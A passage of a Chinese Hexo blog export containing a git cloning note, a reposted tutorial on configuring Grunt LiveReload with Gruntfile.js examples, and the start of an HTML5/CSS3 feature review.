<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> -b gh-pages https://github.com/kuleyu/hexolog.git</span><br></pre></td></tr></table></figure>
<blockquote>
<p>其实没有这个说法，这个命令同样也会把所有分支下载下来，只不过下载后的当前分支是这个指定的分支而已。</p>
</blockquote>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>Grunt 插件之 LiveReload 实现页面自动刷新</title>
    <url>/hexolog/post/5109.html</url>
    <content><![CDATA[<p><a href="http://www.bluesdream.com/blog/grunt-plugin-livereload-wysiwyg-editor.html" target="_blank" rel="noopener" title="Permalink to Grunt插件之LiveReload 实现页面自动刷新，所见即所得编辑 | 蓝色梦想">转载 - 蓝色梦想</a></p>
<p><strong>注意文末的更新</strong></p>
<p>苦B的前端每次在制作和修改页面时，都有一个特定的三部曲：coding-save-F5。很多时候都希望自己一改东西，页面就能立刻显示，而现在LiveReload就能做到这点。</p>
<p>LiveReload会监控你指定的目录中文件，如果有文件被更改，它就自动触发浏览器刷新页面。但如果你修改的是CSS或者图片，页面内容会即时更新，无需重新加载。这样我们不用每次修改文件后，都要去按下F5刷新页面，而是直接就能显示，有点类似所见即所得的编辑模式，特别适合使用双屏coding的人。另外同时结合Sublime text和Emmet LiveStyle，能提高不少开发效率。</p>
<a id="more"></a>
<p><strong>LiveReload安装前的准备工作：</strong></p>
<p>安装Node.js和Grunt，如果第一次接触，可以参考：<a href="http://www.bluesdream.com/blog/windows-installs-the-grunt-and-instructions.html" target="_blank" rel="noopener">Windows下安装Grunt的指南和相关说明</a>，根据步骤操作，创建完package.json 和 Gruntfile.js这2个文件就行。</p>
<p>接下来，开始配置LiveReload所需要的环境和相关插件。这里所提供的有两种安装方案，根据自己需求进行选择。</p>
<p><strong>方案一：grunt-livereload + Chrome Plug-in</strong></p>
<p>优点：安装、配置简单方便。<br />
缺点：需要配合指定的浏览器插件（Firefox也有相关插件，IE么你懂的）。</p>
<p>1. 需要安装2个插接件：grunt-contrib-watch、connect-livereload</p>
<p>执行命令：npm install --save-dev grunt-contrib-watch connect-livereload</p>
<p>2. 安装浏览器插件：<a href="https://chrome.google.com/webstore/detail/livereload/jnihajbhpnppcggbcgedagnkighmdlei" target="_blank" rel="noopener">Chrome LiveReload</a></p>
<p>3. 配置一个Web服务器（IIS/Apache），LiveReload需要在本地服务器环境下运行（对file:///文件路径支持并不是很好）。</p>
<p>4. 修改Gruntfile.js文件：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params">grunt</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 项目配置(任务配置)</span></span><br><span class="line">    grunt.initConfig(&#123;</span><br><span class="line">        pkg: grunt.file.readJSON(<span class="string">'package.json'</span>),</span><br><span class="line">        watch: &#123;</span><br><span class="line">            client: &#123;</span><br><span class="line">                files: [<span class="string">'*.html'</span>, <span class="string">'css/*'</span>, <span class="string">'js/*'</span>, <span class="string">'images/**/*'</span>],</span><br><span class="line">                options: &#123;</span><br><span class="line">                    livereload: <span class="literal">true</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载插件</span></span><br><span class="line">    grunt.loadNpmTasks(<span class="string">'grunt-contrib-watch'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 自定义任务</span></span><br><span class="line">    grunt.registerTask(<span class="string">'live'</span>, [<span class="string">'watch'</span>]);</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>5. 执行：grunt live</p>
<p>看到如下提示，说明已经开始监听任务：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Running &quot;watch&quot; task  </span><br><span class="line">Waiting...</span><br></pre></td></tr></table></figure>
<p>6. 打开我们的页面，例如：<a href="http://localhost/" target="_blank" rel="noopener">http://localhost/</a></p>
<p>7. 再点击Chrome LiveReload插件的ICON，此时ICON圆圈中心的小圆点变成实心的，说明插件执行成功。此时你改下网站文件看看，是不是实时更新了？</p>
<p><strong>方案二：grunt-contrib-watch + grunt-contrib-connect + grunt-livereload</strong></p>
<p>优点：自动搭建静态文件服务器，不需在自己电脑上搭建Web服务器。<br />
不需要浏览器插件的支持（不现定于某个浏览器）。<br />
不需要给网页手动添加livereload.js。<br />
缺点：对于刚接触的人，配置略显复杂。</p>
<p>1. 安装我们所需要的3个插件：grunt-contrib-watch、grunt-contrib-connect、connect-livereload</p>
<p>执行命令：npm install --save-dev grunt-contrib-watch grunt-contrib-connect connect-livereload</p>
<p>2. 修改Gruntfile.js文件：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params">grunt</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// LiveReload的默认端口号，你也可以改成你想要的端口号</span></span><br><span class="line">    <span class="keyword">var</span> lrPort = <span class="number">35729</span>;</span><br><span class="line">    <span class="comment">// 使用connect-livereload模块，生成一个与LiveReload脚本</span></span><br><span class="line">    <span class="comment">// http://www.google-analytics.com/ga.js"&gt; src="http://127.0.0.1:35729/livereload.js?snipver=1" type="text/javascript"&gt;</span></span><br><span class="line">    <span class="keyword">var</span> lrSnippet = <span class="built_in">require</span>(<span class="string">'connect-livereload'</span>)(&#123; <span class="attr">port</span>: lrPort &#125;);</span><br><span class="line">    <span class="comment">// 使用 middleware(中间件)，就必须关闭 LiveReload 的浏览器插件</span></span><br><span class="line">    <span class="keyword">var</span> lrMiddleware = <span class="function"><span class="keyword">function</span>(<span class="params">connect, options</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [</span><br><span class="line">            <span class="comment">// 把脚本，注入到静态文件中</span></span><br><span class="line">            lrSnippet,</span><br><span class="line">            <span class="comment">// 静态文件服务器的路径</span></span><br><span class="line">            connect.static(options.base[<span class="number">0</span>]),</span><br><span class="line">            <span class="comment">// 启用目录浏览(相当于IIS中的目录浏览)</span></span><br><span class="line">            connect.directory(options.base[<span class="number">0</span>])</span><br><span class="line">        ];</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 项目配置(任务配置)</span></span><br><span class="line">    grunt.initConfig(&#123;</span><br><span class="line">        <span class="comment">// 读取我们的项目配置并存储到pkg属性中</span></span><br><span class="line">        pkg: grunt.file.readJSON(<span class="string">'package.json'</span>),</span><br><span class="line">        <span class="comment">// 通过connect任务，创建一个静态服务器</span></span><br><span class="line">        connect: &#123;</span><br><span class="line">            options: &#123;</span><br><span class="line">                <span class="comment">// 服务器端口号</span></span><br><span class="line">                port: <span class="number">8000</span>,</span><br><span class="line">                <span class="comment">// 服务器地址(可以使用主机名localhost，也能使用IP)</span></span><br><span class="line">                hostname: <span class="string">'localhost'</span>,</span><br><span class="line">                <span class="comment">// 物理路径(默认为. 即根目录) 注：使用'.'或'..'为路径的时，可能会返回403 Forbidden. 此时将该值改为相对路径 如：/grunt/reloard。</span></span><br><span class="line">                base: <span class="string">'.'</span></span><br><span class="line">            &#125;,</span><br><span class="line">            livereload: &#123;</span><br><span class="line">                options: &#123;</span><br><span class="line">                    <span class="comment">// 通过LiveReload脚本，让页面重新加载。</span></span><br><span class="line">                    middleware: lrMiddleware</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">// 通过watch任务，来监听文件是否有更改</span></span><br><span class="line">        watch: &#123;</span><br><span class="line">            client: &#123;</span><br><span class="line">                <span class="comment">// 我们不需要配置额外的任务，watch任务已经内建LiveReload浏览器刷新的代码片段。</span></span><br><span class="line">                options: &#123;</span><br><span class="line">                    livereload: lrPort</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="comment">// '**' 表示包含所有的子目录</span></span><br><span class="line">                <span class="comment">// '*' 表示包含所有的文件</span></span><br><span class="line">                files: [<span class="string">'*.html'</span>, <span class="string">'css/*'</span>, <span class="string">'js/*'</span>, <span class="string">'images/**/*'</span>]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;); <span class="comment">// grunt.initConfig配置完毕</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载插件</span></span><br><span class="line">    grunt.loadNpmTasks(<span class="string">'grunt-contrib-connect'</span>);</span><br><span class="line">    grunt.loadNpmTasks(<span class="string">'grunt-contrib-watch'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 自定义任务</span></span><br><span class="line">    grunt.registerTask(<span class="string">'live'</span>, [<span class="string">'connect'</span>, <span class="string">'watch'</span>]);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>5. 执行：grunt live</p>
<p>看到如下提示，说明Web服务器搭建完成，并且开始监听任务：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Running &quot;connect:livereload&quot; (connect) task  </span><br><span class="line">Started connect web server on 127.0.0.1:8000.</span><br><span class="line"></span><br><span class="line">Running &quot;watch&quot; task  </span><br><span class="line">Waiting...</span><br></pre></td></tr></table></figure>
<p>注：执行该命令前，如果你有安装过LiveReload的浏览器插件，必须关闭。</p>
<p>6. 打开我们的页面，例如：<a href="http://localhost:8000/" target="_blank" rel="noopener">http://localhost:8000/</a> 或 <a href="http://127.0.0.1:8000/" target="_blank" rel="noopener">http://127.0.0.1:8000/</a><br />
注：这里所打开的本地服务器地址，是我们刚才通过connect所搭建的静态文件服务器地址，而不是之前你用IIS或Apache自己搭建Web服务器地址。</p>
<p>7. 开始体验吧。</p>
<p>相关插件文档（GitHub）：<br />
<a href="https://github.com/gruntjs/grunt-contrib-watch" target="_blank" rel="noopener">grunt-contrib-watch</a><br />
<a href="https://github.com/gruntjs/grunt-contrib-connect" target="_blank" rel="noopener">grunt-contrib-connect</a><br />
<a href="https://github.com/intesso/connect-livereload" target="_blank" rel="noopener">connect-livereload</a></p>
<p>参考资料：<br />
<a href="http://www.brianchu.com/blog/2013/07/11/grunt-by-example-a-tutorial-for-javascripts-task-runner/" target="_blank" rel="noopener">Grunt by Example - A Tutorial for JavaScript’s Task Runner</a></p>
<p><strong>更新于：2015-08-17</strong><br />
总有小伙伴，通过各种方式给我留言，说自己配置出来运行报错。但通常都无法正确表述问题在哪，这让我很难帮到你什么。另外，我也无法保证所有问题都能即时回复，所以大家可以先通过以下3个步骤，进行自查。<br />
1. 核对下各个插件是否都顺利安装。<br />
2. 检查一边是否有遗漏的步骤和地方。<br />
3. 我把本文的配置信息都上传至了Github，有需要的朋友可以下载下来进行对比：<a href="https://github.com/zhonglimh/Grunt-LiveReload/tree/2caa3b75e6c58218e4d609736f69e48766fb9c15" target="_blank" rel="noopener" title="Github">Github：2015-08-17</a></p>
<p><strong>更新于：2015-10-12</strong><br />
grunt-contrib-connect 0.11.x 版本开始，静态文件服务器的创建，需要安装 serve-static 插件支持，否则会出现错误提示&quot;connect.static is not a function Use.&quot; 另外，启用目录浏览，也需要独立安装 serve-index 插件才能支持。</p>
<p>所以这次补充2个新的插件：serve-static(用于创建静态文件服务器)、serve-index(用于启用目录浏览)</p>
<p>执行命令：npm install --save-dev serve-static serve-index</p>
<p>Gruntfile.js文件更新及调整部分：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用 middleware(中间件)，就必须关闭 LiveReload 的浏览器插件</span></span><br><span class="line"><span class="keyword">var</span> serveStatic = <span class="built_in">require</span>(<span class="string">'serve-static'</span>);</span><br><span class="line"><span class="keyword">var</span> serveIndex = <span class="built_in">require</span>(<span class="string">'serve-index'</span>);</span><br><span class="line"><span class="keyword">var</span> lrMiddleware = <span class="function"><span class="keyword">function</span>(<span class="params">connect, options, middlwares</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        lrSnippet,</span><br><span class="line">        <span class="comment">// 静态文件服务器的路径 原先写法：connect.static(options.base[0])</span></span><br><span class="line">        serveStatic(options.base[<span class="number">0</span>]),</span><br><span class="line">        <span class="comment">// 启用目录浏览(相当于IIS中的目录浏览) 原先写法：connect.directory(options.base[0])</span></span><br><span class="line">        serveIndex(options.base[<span class="number">0</span>])</span><br><span class="line">    ];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>完整版请查看：<a href="https://github.com/zhonglimh/Grunt-LiveReload" target="_blank" rel="noopener" title="Github">Github：2015-10-12</a></p>
]]></content>
      <categories>
        <category>搬运整理</category>
      </categories>
      <tags>
        <tag>grunt</tag>
      </tags>
  </entry>
  <entry>
    <title>HTML5+CSS3整体回顾</title>
    <url>/hexolog/post/d1c7e878.html</url>
    <content><![CDATA[<blockquote>
<p><a href="http://blog.poetries.top/2016/10/19/HTML5+CSS3%E5%9F%BA%E7%A1%80%E5%9B%9E%E9%A1%BE%20/" target="_blank" rel="noopener">转载自Poetry’s Blog</a></p>
</blockquote>
<p>这篇文章主要总结H5的一些新增的功能以及一些基础归纳，这里只是一个提纲，并不是很详细，后面会一直完善补充新的内容，本文是一些笔记记录，放在这里供自己参考也供他人学习！</p>
<a id="more"></a>
<p><img src="http://upload-images.jianshu.io/upload_images/1480597-63390b75c7b22ea1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="HTML5概览" /></p>
<h3 id="第一课-html5结构"><a class="markdownIt-Anchor" href="#第一课-html5结构"></a> 第一课 HTML5结构</h3>
<hr />
<ul>
<li><code>HTML5</code> 是新一代的 <code>HTML</code></li>
<li><code>DTD</code>声明改变	<code>&lt;!DOCTYPE html&gt;</code>
<ul>
<li>新的结构标签</li>
</ul>
</li>
</ul>
<p><img src="http://upload-images.jianshu.io/upload_images/1480597-ce00790dcabf9c47.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="一些总结--from-dunitian" /></p>
<h4 id="常用的一些新的结构标签"><a class="markdownIt-Anchor" href="#常用的一些新的结构标签"></a> 常用的一些新的结构标签</h4>
<hr />
<p><img src="http://upload-images.jianshu.io/upload_images/1480597-4585c0d9a5309443.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="结构标签" /></p>
<p><img src="http://upload-images.jianshu.io/upload_images/1480597-a13888da66c8fc8a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="多媒体交互标签" /></p>
<p><img src="http://upload-images.jianshu.io/upload_images/1480597-458752a50858db60.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="特殊样式标签" /></p>
<p><img src="http://upload-images.jianshu.io/upload_images/1480597-2b18ca0ffce0ec14.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="兼容性不是很好的标签" /></p>
<ul>
<li>补充说明
<ul>
<li><code>small</code> 这个元素表示边栏评论，如附属细则</li>
<li><code>cite</code>这个元素可用于显示作品标题（图书、电影、诗歌等）</li>
<li><code>adress</code>这个元素显示<code>article</code>或整个文档的合同信息，且位于<code>footer</code>这个元素之中</li>
<li><code>time</code>显示人和机器可读的日期和时间，而且机器可读的时间戳是属性<code>datetime</code>的值第二个可选的是<code>pubtime</code>用于表示出版日期值</li>
</ul>
</li>
</ul>
<h4 id="删除的html标签"><a class="markdownIt-Anchor" href="#删除的html标签"></a> 删除的<code>HTML</code>标签</h4>
<hr />
<ul>
<li>
<p>纯表现的元素：</p>
<ul>
<li><code>basefont</code></li>
<li><code>big</code></li>
<li><code>center</code></li>
<li><code>font</code></li>
<li><code>s</code></li>
<li><code>strike</code></li>
<li><code>tt</code></li>
<li><code>u</code></li>
</ul>
</li>
<li>
<p>对可用性产生负面影响的元素：</p>
<ul>
<li><code>frame</code></li>
<li><code>frameset</code></li>
<li><code>noframes</code></li>
<li>产生混淆的元素：
<ul>
<li><code>acronym</code></li>
<li><code>applet</code></li>
<li><code>isindex</code></li>
<li><code>dir</code></li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>重新定义的<code>HTML</code>标签</strong></p>
<ul>
<li><code>&lt;b&gt;</code>  代表内联文本，通常是粗体，没有传递表示重要的意思</li>
<li><code>&lt;i&gt;</code> 代表内联文本，通常是斜体，没有传递表示重要的意思</li>
<li><code>&lt;dd&gt;</code> 可以同<code>details</code>与<code>figure</code>一同使用，定义包含文本，<code>dialog</code>也可用</li>
<li><code>&lt;dt&gt;</code> 可以同<code>details</code>与<code>figure</code>一同使用，汇总细节，<code>dialog</code>也可用</li>
<li><code>&lt;hr&gt;</code>表示主题结束，而不是水平线，虽然显示相同</li>
<li><code>&lt;menu&gt;</code> 重新定义用户界面的菜单，配合<code>commond</code>或者<code>menuitem</code>使用</li>
<li><code>&lt;small&gt;</code> 表示小字体，例如打印注释或者法律条款</li>
<li><code>&lt;strong&gt;</code> 表示重要性而不是强调符号</li>
</ul>
</li>
<li>
<p>崭新新的页面布局</p>
</li>
</ul>
<p><img src="http://upload-images.jianshu.io/upload_images/1480597-b8990303b1d10379.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="传统的布局" /></p>
<p><img src="http://upload-images.jianshu.io/upload_images/1480597-a7b3e5dca9341862.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="HTML5标签布局" /></p>
<p><img src="http://upload-images.jianshu.io/upload_images/1480597-6f30a458860e606f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="实例-from-dunitian" /></p>
<p><img src="http://upload-images.jianshu.io/upload_images/1480597-dd4078736467f182.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="草图--from-dunitian" /></p>
<h3 id="第二课-html5智能表单"><a class="markdownIt-Anchor" href="#第二课-html5智能表单"></a> 第二课 HTML5智能表单</h3>
<hr />
<h4 id="html401-form表单复习"><a class="markdownIt-Anchor" href="#html401-form表单复习"></a> HTML4.01 form表单复习</h4>
<hr />
<ul>
<li><code>input</code>表单<code>type</code>属性值
<ul>
<li><code>type=&quot;text&quot;</code>          单行文本输入框</li>
<li><code>type=&quot;password&quot;</code>  密码（<code>maxlength=&quot;&quot;</code>）</li>
<li><code>type=&quot;radio&quot;</code>       单项选择（<code>checked=&quot;checked&quot;</code>）</li>
<li><code>type=&quot;checkbox&quot;</code>  多项选择</li>
<li><code>type=&quot;button&quot;</code>     按钮</li>
<li><code>type=&quot;submit&quot;</code>	     提交</li>
<li><code>type=&quot;file&quot;</code>           上传文件</li>
<li><code>type=&quot;reset&quot;</code>    重置</li>
</ul>
</li>
</ul>
<h4 id="html5智能表单"><a class="markdownIt-Anchor" href="#html5智能表单"></a> HTML5智能表单</h4>
<hr />
<ul>
<li><code>input</code>表单<code>type</code>属性值：
<ul>
<li><code>type = &quot;email&quot;</code> 限制用户输入必须为<code>Email</code>类型</li>
<li><code>type=&quot;url&quot;</code>	      限制用户输入必须为<code>URL</code>类型</li>
<li><code>type=&quot;date&quot;</code>     限制用户输入必须为日期类型</li>
<li><code>type=&quot;datetime&quot;</code> 显示完整日期 含时区</li>
<li><code>type=&quot;datetime-local&quot;</code> 显示完整日期 不含时区</li>
<li><code>type=&quot;time&quot;</code>    限制用户输入必须为时间类型</li>
<li><code>type=&quot;month&quot;</code>  限制用户输入必须为月类型</li>
<li><code>type=&quot;week&quot;</code>    限制用户输入必须为周类型</li>
<li><code>type=&quot;number&quot;</code> 限制用户输入必须为数字类型</li>
<li><code>type=&quot;range&quot;</code>    生成一个滑动条</li>
<li><code>type=&quot;search&quot;</code>  具有搜索意义的表单<code>results=&quot;n&quot;</code>属性</li>
<li><code>type=&quot;color&quot;</code>    生成一个颜色选择表单</li>
<li><code>type=&quot;tel&quot;</code>    显示电话号码</li>
</ul>
</li>
</ul>
<h4 id="input-类型-date-pickers日期选择器"><a class="markdownIt-Anchor" href="#input-类型-date-pickers日期选择器"></a> Input 类型 - Date Pickers（日期选择器）</h4>
<hr />
<ul>
<li>
<p>**<code>HTML5</code> 拥有多个可供选取日期和时间的新输入类型：</p>
</li>
<li>
<p><code>date</code> 选取日、月、年</p>
</li>
<li>
<p><code>month</code> 选取月、年</p>
</li>
<li>
<p><code>week</code>  选取周和年</p>
</li>
<li>
<p><code>time</code>  选取时间（小时和分钟）</p>
</li>
<li>
<p>以下两个没有作用</p>
<ul>
<li><code>datetime</code>  选取时间、日、月、年（UTC 时间）</li>
<li><code>datetime-local</code>  选取时间、日、月、年（本地时间）</li>
</ul>
</li>
</ul>
<h4 id="html5新增表单属性"><a class="markdownIt-Anchor" href="#html5新增表单属性"></a> HTML5新增表单属性</h4>
<hr />
<ul>
<li><code>required:</code> <code>required</code>内容不能为空</li>
<li><code>placeholder:</code> 表单提示信息</li>
<li><code>autofocus:</code>自动聚焦</li>
<li><code>pattern:</code> 正则表达式  输入的内容必须匹配到指定正则范围</li>
<li><code>autocomplete:</code>是否保存用户输入值
<ul>
<li>默认为<code>on</code>，关闭提示选择<code>off</code></li>
</ul>
</li>
<li><code>formaction:</code> 在<code>submit</code>里定义提交地址</li>
<li><code>datalist:</code> 输入框选择列表配合<code>list</code>使用 <code>list</code>值为<code>datalist</code>的<code>id</code>值</li>
<li><code>output:</code> 计算或脚本输出</li>
</ul>
<h4 id="表单验证"><a class="markdownIt-Anchor" href="#表单验证"></a> 表单验证</h4>
<hr />
<ul>
<li>
<p><code>validity</code>对象，通过下面的<code>valid</code>可以查看验证是否通过，如果八种验证都返回<code>true</code>,一种验证失败返回<code>false</code></p>
<ul>
<li><code>oText.addEventListener(&quot;invalid&quot;,fn1,false)</code></li>
<li><code>ev.preventDefault()</code>: 阻止默认事件</li>
<li><code>valueMissing</code>: 当输入值为空的时候，返回<code>true</code></li>
<li><code>typeMismatch</code>: 控件值与预期不吻合，返回<code>true</code></li>
<li><code>patternMismatch</code>: 输入值不满足<code>pattern</code>正则，返回<code>true</code></li>
<li><code>cusomError</code>
<ul>
<li><code>setCustomValidity()</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="第三课-css3选择器"><a class="markdownIt-Anchor" href="#第三课-css3选择器"></a> 第三课 css3选择器</h3>
<hr />
<p><img src="http://upload-images.jianshu.io/upload_images/1480597-5c90a330f791f359.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="css3属性快速一览" /></p>
<p><img src="http://upload-images.jianshu.io/upload_images/1480597-556426384ddcc4ce.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="css3属性快速一览" /></p>
<ul>
<li>
<p><code>CSS3</code>发展史简介</p>
<ul>
<li><code>HTML</code>的诞生 20世纪90年代初</li>
<li><code>1996</code>年底，	<code>CSS</code>第一版诞生</li>
<li><code>1998</code>年<code>5</code>月 	<code>CSS2</code>正式发布</li>
<li><code>2004</code>年 	<code>CSS2.1</code>发布</li>
<li><code>CSS3</code>的发布	<code>2002</code> <code>2003</code>  <code>2004</code> <code>2005</code>  <code>2007</code> <code>2009</code> <code>2010</code></li>
</ul>
</li>
<li>
<p><strong>模块化开发</strong></p>
<ul>
<li><code>CSS1</code> 中定义了网页的基本属性：
<ul>
<li>字体、颜色、基本选择器等</li>
</ul>
</li>
<li><code>CSS2</code>中在<code>CSS1</code>的基础上添加了高级功能
<ul>
<li>浮动和定位、高级选择器等(子选择器、相邻选择器、通用选择器)</li>
</ul>
</li>
<li><code>CSS3</code>遵循的是模块化开发。发布时间并不是一个时间点，而是一个时间段</li>
</ul>
</li>
</ul>
<h4 id="css选择器复习"><a class="markdownIt-Anchor" href="#css选择器复习"></a> <code>CSS</code>选择器复习</h4>
<hr />
<ul>
<li>
<p>通用选择器：<code>*</code> 选择到所有的元素</p>
</li>
<li>
<p>选择子元素：<code>&gt;</code> 选择到元素的直接后代</p>
</li>
<li>
<p>相邻兄弟选择器：<code>+</code>选择到紧随目标元素后的第一个元素</p>
</li>
<li>
<p>普通兄弟选择器：<code>~</code>选择到紧随其后的所有兄弟元素</p>
</li>
<li>
<p>伪元素选择器：</p>
<ul>
<li><code>::first-line</code> 匹配文本块的首行</li>
<li><code>::first-letter</code> 选择文本块的首字母</li>
</ul>
</li>
<li>
<p>伪类选择器：</p>
<ul>
<li><code>:before</code>,<code>:after</code>在元素内容前面、后面添加内容(相当于行内元素)</li>
</ul>
</li>
<li>
<p><strong>CSS3结构选择器</strong></p>
</li>
</ul>
<p><img src="http://upload-images.jianshu.io/upload_images/1480597-33def0f200fe738a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="CSS3结构选择器" /></p>
<ul>
<li><strong><code>Css3</code> 属性选择器</strong></li>
</ul>
<p><img src="http://upload-images.jianshu.io/upload_images/1480597-f9339ed4dcc201aa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Css3属性选择器" /></p>
<ul>
<li>
<p><strong><code>CSS3</code>伪类选择器</strong></p>
<ul>
<li>
<p><strong>UI伪类选择器：</strong></p>
<ul>
<li><code>:enabled</code>选择启用状态元素</li>
<li><code>:disabled</code> 选择禁用状态元素</li>
<li><code>:checked</code>选择被选中的<code>input</code>元素（单选按钮或复选框）</li>
<li><code>:default</code> 选择默认元素</li>
<li><code>:valid</code>、<code>invalid</code> 根据输入验证选择有效或无效的<code>input</code>元素</li>
<li><code>:in-range</code>、<code>out-of-range</code>选择指定范围之内或者之外受限的元素</li>
<li><code>:required</code>、<code>optional</code>根据是否允许:<code>required</code>属性选择<code>input</code>元素</li>
</ul>
</li>
<li>
<p><strong>动态伪类选择器：</strong></p>
<ul>
<li><code>:link</code>选择链接元素</li>
<li><code>:visited</code> 选择用户以访问的元素</li>
<li><code>:hover</code> 鼠标悬停其上的元素</li>
<li><code>:active</code>鼠标点击时触发的事件</li>
<li><code>:focus</code> 当前获取焦点的元素</li>
</ul>
</li>
<li>
<p><strong>其他伪类选择器</strong>：</p>
<ul>
<li><code>:not(&lt;选择器&gt;)</code>对括号内选择器的选择取反</li>
<li><code>:lang(&lt;目标语言&gt;)</code> 基于<code>lang</code>全局属性的元素</li>
<li><code>:target</code> <code>url</code>片段标识符指向的元素
<ul>
<li><code>:empty</code>选择内容为空的元素</li>
</ul>
</li>
<li><code>:selection</code>鼠标光标选择元素内容</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="第四课-css3新增文本属性"><a class="markdownIt-Anchor" href="#第四课-css3新增文本属性"></a> 第四课 CSS3新增文本属性</h3>
<hr />
<h4 id="css文本属性复习"><a class="markdownIt-Anchor" href="#css文本属性复习"></a> CSS文本属性复习</h4>
<hr />
<ul>
<li>
<p><code>white-space</code>：对象内空格的处理方式</p>
<ul>
<li>
<p><code>nowrap</code> 控制文本不换行</p>
</li>
<li>
<p><code>pre</code> 空白会被浏览器保留</p>
</li>
<li>
<p><code>pre-line</code> 合并空白  保留换行符</p>
</li>
<li>
<p><code>pre-wrap</code> 保留空白  正常换行</p>
</li>
</ul>
</li>
<li>
<p><code>direction</code>：文本流的方向</p>
<ul>
<li><code>ltr</code> 文本从左向右</li>
<li><code>rtl</code>  文本从右往左</li>
</ul>
</li>
<li>
<p><code>unicode-bidi</code>：用于同一个页面里存在从不同方向读进的文本显示。与<code>direction</code>属性一起使用</p>
</li>
</ul>
<h4 id="css3新增文本属性"><a class="markdownIt-Anchor" href="#css3新增文本属性"></a> CSS3新增文本属性</h4>
<hr />
<ul>
<li><code>color:rgba()</code>;</li>
<li><code>text-overflow</code>:是否使用一个省略标记（…）标示对象内文本的溢出</li>
<li><code>text-align</code>:文本的对齐方式</li>
<li><code>text-transform</code>:文字的大小写</li>
<li><code>text-decoration</code>:文本的装饰线，复合属性</li>
<li><code>text-shadow</code>:文本阴影</li>
<li><code>text-fill-color</code>:文字填充颜色</li>
<li><code>text-stroke</code>:复合属性。设置文字的描边</li>
<li><code>tab-size</code>:制表符的长度</li>
<li><code>word-wrap</code>:当前行超过指定容器的边界时是否断开转行</li>
<li><code>word-break</code>:规定自动换行的处理方法</li>
</ul>
<hr />
<ul>
<li>
<p><strong><code>text-overflow:</code>是否使用一个省略标记（<code>...</code>）标示对象内文本的溢出</strong></p>
<ul>
<li><code>clip</code>： 默认值 无省略号</li>
<li><code>ellipsis</code>：当对象内文本溢出时显示省略标记（<code>...</code>）。</li>
<li><strong>注意</strong>：该属性需配合<code>over-flow:hidden</code>属性(超出处理)还有 <code>white-space:nowrap</code>(禁止换行)配合使用，否则无法看到效果</li>
</ul>
</li>
<li>
<p><strong><code>text-align</code>:文本的对齐方式</strong></p>
<ul>
<li><code>css1</code></li>
<li><code>left</code>:默认值 左对齐</li>
<li><code>right</code>:右对齐</li>
<li><code>center</code>:居中</li>
<li><code>justify</code>： 内容两端对齐。</li>
<li><code>css3</code></li>
<li><code>start</code>:开始边界对齐</li>
<li><code>end</code>:结束边界对齐</li>
</ul>
</li>
<li>
<p><strong><code>text-transform</code></strong>:文字的大小写</p>
<ul>
<li><strong><code>css1</code></strong>
<ul>
<li><code>none</code>：	默认值 无转换</li>
<li><code>capitalize</code>： 	将每个单词的第一个字母转换成大写</li>
<li><code>uppercase</code>：	转换成大写</li>
<li><code>lowercase</code>：	转换成小写</li>
</ul>
</li>
<li><strong><code>css3</code></strong>
<ul>
<li><code>full-width</code>：	将左右字符设为全角形式。不支持</li>
<li><code>full-size-kana</code>：将所有小假名字符转换为普通假名。不支持
<ul>
<li>例如：土耳其语</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong><code>text-decoration</code>:文本的装饰线，复合属性(只火狐支持)</strong></p>
<ul>
<li><code>text-decoration-line</code>：
<ul>
<li>指定文本装饰的种类。相当于<code>CSS1</code>时的<code>text-decoration</code>属性</li>
</ul>
</li>
<li><code>text-decoration-style</code> ：
<ul>
